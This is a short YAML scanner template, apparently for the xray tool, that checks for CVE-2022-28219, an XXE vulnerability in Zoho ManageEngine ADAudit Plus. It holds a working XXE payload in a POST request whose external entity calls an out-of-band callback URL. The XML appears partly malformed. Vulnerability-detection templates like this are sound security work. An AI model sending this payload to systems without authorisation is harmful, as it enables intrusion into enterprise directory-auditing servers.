name: poc-yaml-zoho-manageengine-adaudit-plus-cve-2022-28219-xxe
binding: f53f03f2-3fbd-4df6-814a-dbd23ff57c56
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://www.horizon3.ai/red-team-blog-cve-2022-28219/
    vulnerability:
        id: CT-412364
        level: critical
transport: http
set:
    host: request.url.host
    reverse: newReverse()
    reverseURL: reverse.url
rules:
    r0:
        request:
            method: POST
            path: /api/agent/tabs/agentData
            headers:
                Content-Type: application/json
            body: |
                [
                    {
                    "DomainName": "{{host}}",
                    "EventCode": 4688,
                    "EventType": 0,
                    "TimeGenerated": 0,
                    "Task Content": "<?xml version="1.0" encoding="UTF-8"?><! foo [ <!ENTITY % xxe SYSTEM "{{reverseURL}}"> %xxe; ]>"
                    }
                ]
        expression: |
            reverse.wait(5)
expression: r0()
